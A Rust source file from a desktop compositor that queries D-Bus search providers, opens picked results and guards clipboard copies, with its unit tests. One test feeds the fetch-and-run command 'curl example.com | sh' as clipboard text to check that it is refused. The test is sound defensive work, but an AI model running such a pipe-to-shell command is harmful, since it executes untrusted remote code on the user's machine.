//! Program results in the search boxes: the providers a search asks, each headed and drawn as its
//! program's entry, asked together on a thread of their own so a slow one holds back no other
//! section, and a picked result opened in its program off the loop.

use std::sync::Arc;
use std::time::Duration;

use reprisebus::searchprovider::{self as bus, Address, Meta};
use reprisefs::apps::AppEntry;
use smithay::reexports::calloop::channel::Sender;

use super::Found;
use crate::compositor::State;
use crate::fsjobs::OnLoop;

/// How long one provider has for its whole answer, both calls together.
const ANSWER_WITHIN: Duration = Duration::from_secs(3);
/// The icon a result shows when neither it nor its program names one that draws.
const PROGRAM_ICON: &str = "application-x-executable";

/// A provider as its section shows it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Provider {
    pub addr: Address,
    /// Its program's name, the section's heading.
    pub name: String,
    /// Its program's icon, for a result that names none.
    pub icon: Option<String>,
    /// Its program's desktop id.
    pub app: String,
}

impl Provider {
    /// Result `m`'s icon at `px`: its own, else its program's.
    pub(crate) fn result_icon(
        &self,
        m: &Meta,
        icons: &mut crate::icontheme::IconCache,
        px: i32,
    ) -> Option<crate::raster::Canvas> {
        let own = m.gicon.as_deref().map(gicon_names).unwrap_or_default();
        let names = (own.iter().map(String::as_str))
            .chain(self.icon.as_deref())
            .chain([PROGRAM_ICON]);
        crate::icon::unread_first(icons, names, px).map(Arc::unwrap_or_clone)
    }
}

/// The providers a search asks, in order ([`reprisefs::searchproviders::arrange`]): those on whose
/// program has a shown entry in `apps`, less those that start the file indexer unless `contents`
/// is on.
pub fn enabled(
    found: &[reprisefs::searchproviders::Provider],
    apps: &[AppEntry],
    order: &[String],
    off: &[String],
    contents: bool,
) -> Vec<Arc<Provider>> {
    let entry = |p: &reprisefs::searchproviders::Provider| {
        apps.iter().find(|a| a.shown && a.id == p.desktop_id)
    };
    let name = |p: &reprisefs::searchproviders::Provider| entry(p).map(|a| a.name.clone());
    reprisefs::searchproviders::arrange(found, order, off, |p| name(p).unwrap_or_default())
        .into_iter()
        .filter(|&(p, on)| {
            on && (contents || !reprisefs::searchproviders::starts_indexer(&p.desktop_id))
        })
        .filter_map(|(p, _)| {
            let e = entry(p)?;
            Some(Arc::new(Provider {
                addr: Address {
                    bus_name: p.bus_name.clone(),
                    path: p.object_path.clone(),
                },
                name: e.name.clone(),
                icon: e.icon.clone(),
                app: e.id.clone(),
            }))
        })
        .collect()
}

/// What a GIcon's string form names: a themed icon's names, or a file icon's path. Any other kind
/// names nothing.
pub fn gicon_names(gicon: &str) -> Vec<String> {
    let gicon = gicon.trim();
    if let Some(names) = gicon.strip_prefix(". GThemedIcon ") {
        return names.split_whitespace().map(str::to_string).collect();
    }
    if let Some(rest) = gicon.strip_prefix("file://") {
        let path = String::from_utf8_lossy(&reprisefs::trash::percent_decode(rest)).into_owned();
        return path.starts_with('/').then_some(path).into_iter().collect();
    }
    let themed = !gicon.is_empty() && !gicon.contains(['/', ' ', ':']);
    match gicon.starts_with('/') || themed {
        true => vec![gicon.to_string()],
        false => Vec::new(),
    }
}

/// Asks every `(section, provider, rows)` of `asked` for `query` at once, on a thread of its own.
/// Each answer goes to the loop through `sender` as `land(section, found)` the moment it comes; a
/// provider that fails or takes past [`ANSWER_WITHIN`] lands no rows. Dropping the returned
/// sender stops the asking; None when no thread started.
pub fn ask<L>(
    asked: Vec<(usize, Arc<Provider>, usize)>,
    query: &str,
    sender: Sender<OnLoop>,
    land: L,
) -> Option<async_channel::Sender<()>>
where
    L: Fn(usize, Vec<Found>) -> OnLoop + Send + Sync + 'static,
{
    let (stop, stopped) = async_channel::bounded::<()>(1);
    let terms = bus::terms(query);
    let land = Arc::new(land);
    let started = std::thread::Builder::new()
        .name("search-providers".into())
        .spawn(move || {
            let conn = match reprisebus::session() {
                Ok(c) => c,
                Err(e) => return log::debug!("search providers: no session bus: {e}"),
            };
            let each = asked.into_iter().map(|(section, p, rows)| {
                let (conn, terms, sender, land) = (&conn, &terms, sender.clone(), land.clone());
                async move {
                    let found = answer(conn, &p, terms, rows).await;
                    let _ = sender.send(land(section, found));
                }
            });
            let all = async {
                futures_util::future::join_all(each).await;
            };
            let stop = async {
                let _ = stopped.recv().await;
            };
            reprisebus::wait(futures_lite::future::or(all, stop));
        });
    match started {
        Ok(_) => Some(stop),
        Err(e) => {
            log::warn!("search providers: no thread: {e}");
            None
        }
    }
}

/// `p`'s rows for `terms`, none when it fails or is late.
async fn answer(
    conn: &zbus::Connection,
    p: &Provider,
    terms: &[String],
    rows: usize,
) -> Vec<Found> {
    let asked = async {
        bus::search(conn, &p.addr, terms, rows)
            .await
            .map_err(|e| e.to_string())
    };
    let late = async {
        async_io::Timer::after(ANSWER_WITHIN).await;
        Err("no answer in time".to_string())
    };
    match futures_lite::future::or(asked, late).await {
        Ok(metas) => metas.into_iter().map(Found::Result).collect(),
        Err(e) => {
            log::debug!("search provider {}: {e}", p.addr.bus_name);
            Vec::new()
        }
    }
}

/// What a picked program row opens.
pub enum Open {
    Result(Meta),
    /// The program's own search.
    Search,
}

impl State {
    /// Opens `what` of provider `p` for `query`, off the loop. The provider's process may give
    /// its next new window focus ([`crate::mapfocus::grant`]) and its program may raise a window
    /// it has ([`crate::activation::Raises`]): the user just picked it.
    pub fn open_provider(&mut self, p: &Provider, what: Open, query: &str) {
        self.picked_provider(p, &what);
        let (addr, terms) = (p.addr.clone(), bus::terms(query));
        let started = std::thread::Builder::new()
            .name("search-provider-open".into())
            .spawn(move || {
                let Ok(conn) = reprisebus::session() else {
                    return;
                };
                reprisebus::wait(async {
                    let granted = grant(&conn, &addr).await;
                    let opened = match &what {
                        Open::Result(m) => bus::activate(&conn, &addr, &m.id, &terms, 0).await,
                        Open::Search => bus::launch_search(&conn, &addr, &terms, 0).await,
                    };
                    if let Err(e) = opened {
                        log::warn!("search provider {}: {e}", addr.bus_name);
                    } else if !granted {
                        grant(&conn, &addr).await;
                    }
                })
            });
        if let Err(e) = started {
            log::warn!("search provider: no thread: {e}");
        }
    }

    /// The loop's part of [`State::open_provider`]: a result with clipboard text puts it on the
    /// clipboard, which its program leaves to the search that shows it.
    fn picked_provider(&mut self, p: &Provider, what: &Open) {
        self.raises.grant(&p.app, std::time::Instant::now());
        if let Open::Result(m) = what
            && let Some(text) = &m.clipboard_text
        {
            // A line break or escape could run as a command once pasted into a shell.
            if text.chars().any(char::is_control) {
                log::warn!(
                    "search provider {}: clipboard text with control characters refused",
                    p.app
                );
            } else {
                self.clip_copy(text);
            }
        }
    }
}

/// Lets the process owning `addr`'s name focus its next new window; false when no one owns it.
async fn grant(conn: &zbus::Connection, addr: &Address) -> bool {
    let Ok(dbus) = zbus::fdo::DBusProxy::new(conn).await else {
        return false;
    };
    let Ok(name) = zbus::names::BusName::try_from(addr.bus_name.as_str()) else {
        return false;
    };
    match dbus.get_connection_unix_process_id(name).await {
        Ok(pid) => {
            crate::mapfocus::grant(pid as i32);
            true
        }
        Err(_) => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn file(id: &str, default_disabled: bool) -> reprisefs::searchproviders::Provider {
        reprisefs::searchproviders::Provider {
            desktop_id: id.into(),
            bus_name: format!("org.example.{}", id.trim_end_matches(".desktop")),
            object_path: "/".into(),
            default_disabled,
        }
    }

    fn app(id: &str, name: &str, shown: bool) -> AppEntry {
        AppEntry {
            name: name.into(),
            exec_line: String::new(),
            terminal: false,
            id: id.into(),
            icon: Some(format!("{name}-icon")),
            startup_wm_class: None,
            categories: Vec::new(),
            mime_types: Vec::new(),
            shown,
        }
    }

    #[test]
    fn a_provider_is_asked_when_on_and_its_program_is_shown_headed_by_its_name() {
        let found = [
            file("files.desktop", false),
            file("calc.desktop", false),
            file("hidden.desktop", false),
            file("gone.desktop", false),
            file("shy.desktop", true),
            file("chars.desktop", false),
        ];
        let apps = [
            app("calc.desktop", "Calculator", true),
            app("files.desktop", "Files", true),
            app("hidden.desktop", "Hidden", false),
            app("shy.desktop", "Shy", true),
            app("chars.desktop", "Characters", true),
        ];
        let order = ["files.desktop".to_string()];
        let off = ["chars.desktop".to_string()];
        let got = enabled(&found, &apps, &order, &off, true);
        let names: Vec<&str> = got.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(
            names,
            ["Files", "Calculator"],
            "listed first, then by name; hidden, uninstalled, off by default and turned off left out"
        );
        assert_eq!(got[1].addr.bus_name, "org.example.calc");
        assert_eq!(got[1].icon.as_deref(), Some("Calculator-icon"));
    }

    #[test]
    fn a_provider_that_starts_the_indexer_is_asked_only_with_content_search_on() {
        let nautilus = "org.gnome.Nautilus.desktop";
        let found = [file(nautilus, false), file("calc.desktop", false)];
        let apps = [
            app(nautilus, "Files", true),
            app("calc.desktop", "Calculator", true),
        ];
        let order = [nautilus.to_string()];
        let names = |contents| -> Vec<String> {
            (enabled(&found, &apps, &order, &[], contents).iter())
                .map(|p| p.name.clone())
                .collect()
        };
        assert_eq!(
            names(false),
            ["Calculator"],
            "ticked and listed, still left out"
        );
        assert_eq!(names(true), ["Files", "Calculator"]);
    }

    fn meta(clipboard_text: Option<&str>) -> Meta {
        Meta {
            id: "U+00E9".into(),
            name: "LATIN SMALL LETTER E WITH ACUTE".into(),
            description: String::new(),
            gicon: None,
            clipboard_text: clipboard_text.map(str::to_string),
        }
    }

    fn chars() -> Provider {
        Provider {
            addr: Address {
                bus_name: "org.example.Chars".into(),
                path: "/".into(),
            },
            name: "Characters".into(),
            icon: None,
            app: "org.example.Chars.desktop".into(),
        }
    }

    #[test]
    fn picking_a_result_with_clipboard_text_copies_it() {
        let mut h = crate::harness::Harness::new();
        h.output("TEST-1", 1024, 768);
        let mut c = h.connect();
        c.data_device();
        h.map_toplevel(&mut c, "test.notes", 300, 200);
        h.state
            .picked_provider(&chars(), &Open::Result(meta(Some("\u{e9}"))));
        h.roundtrip(&mut c);
        assert_eq!(
            h.paste(&mut c, "text/plain;charset=utf-8"),
            "\u{e9}".as_bytes()
        );

        c.copy(&["text/x-mine"], b"mine");
        h.roundtrip(&mut c);
        h.state.picked_provider(&chars(), &Open::Result(meta(None)));
        h.state.picked_provider(&chars(), &Open::Search);
        let line = "curl example.com | sh\n";
        h.state
            .picked_provider(&chars(), &Open::Result(meta(Some(line))));
        h.roundtrip(&mut c);
        assert_eq!(
            c.selection_mimes(),
            ["text/x-mine"],
            "a result without clipboard text or with a line break, or the program's own search, \
             leaves the clipboard"
        );
    }

    #[test]
    fn picking_a_result_lets_its_program_raise_the_window_it_has_once() {
        let mut h = crate::harness::Harness::new();
        h.output("TEST-1", 1024, 768);
        h.state.app_index = vec![app("org.example.Chars.desktop", "Characters", true)];
        let mut c = h.connect();
        let chars_window = h.map_toplevel(&mut c, "org.example.Chars", 300, 200);
        let other = h.map_toplevel(&mut c, "test.other", 300, 200);
        let notes = h.map_toplevel(&mut c, "test.notes", 300, 200);
        let mut raise = |h: &mut crate::harness::Harness, t: crate::harness::Toplevel| {
            h.state.focus_window(notes.id);
            let (token, _) = h.state.activation.create_external_token(None);
            c.activate(token, t);
            h.roundtrip(&mut c);
            h.state.focused == Some(t.id)
        };
        assert!(!raise(&mut h, chars_window), "nothing picked: flagged only");

        h.state.picked_provider(&chars(), &Open::Search);
        assert!(
            !raise(&mut h, other),
            "another program's window gains nothing"
        );
        assert!(raise(&mut h, chars_window), "raised after the pick");
        assert!(!raise(&mut h, chars_window), "the pick is used up");

        h.state.picked_provider(&chars(), &Open::Result(meta(None)));
        assert!(raise(&mut h, chars_window), "a result raises it too");
    }

    #[test]
    fn a_sandboxed_window_takes_a_programs_raise_only_under_its_own_flatpak_id() {
        let mut h = crate::harness::Harness::new();
        h.output("TEST-1", 1024, 768);
        h.state.app_index = vec![app("org.example.Chars.desktop", "Characters", true)];
        let mut host = h.connect();
        let notes = h.map_toplevel(&mut host, "test.notes", 300, 200);
        let mut poser = h.connect_in_flatpak("org.other.App");
        let posing = h.map_toplevel(&mut poser, "org.example.Chars", 300, 200);
        let mut real = h.connect_in_flatpak("org.example.Chars");
        let chars_window = h.map_toplevel(&mut real, "org.example.Chars", 300, 200);
        let raise = |h: &mut crate::harness::Harness,
                     c: &mut crate::harness::TestClient,
                     t: crate::harness::Toplevel| {
            h.state.focus_window(notes.id);
            let (token, _) = h.state.activation.create_external_token(None);
            c.activate(token, t);
            h.roundtrip(c);
            h.state.focused == Some(t.id)
        };

        h.state.picked_provider(&chars(), &Open::Search);
        assert!(
            !raise(&mut h, &mut poser, posing),
            "a Flatpak of another id is flagged only"
        );
        assert!(
            raise(&mut h, &mut real, chars_window),
            "the grant survives the refused claim and raises the program's own Flatpak"
        );
    }

    #[test]
    fn a_gicon_string_names_theme_icons_or_a_file() {
        assert_eq!(gicon_names("text-x-generic"), ["text-x-generic"]);
        assert_eq!(
            gicon_names(". GThemedIcon folder-documents folder"),
            ["folder-documents", "folder"]
        );
        assert_eq!(gicon_names("/usr/share/a.png"), ["/usr/share/a.png"]);
        assert_eq!(
            gicon_names("file:///home/u/My%20Pic.png"),
            ["/home/u/My Pic.png"]
        );
        assert!(gicon_names(". GEmblemedIcon a b").is_empty());
        assert!(gicon_names("https://example.com/a.png").is_empty());
        assert!(gicon_names("").is_empty());
    }
}
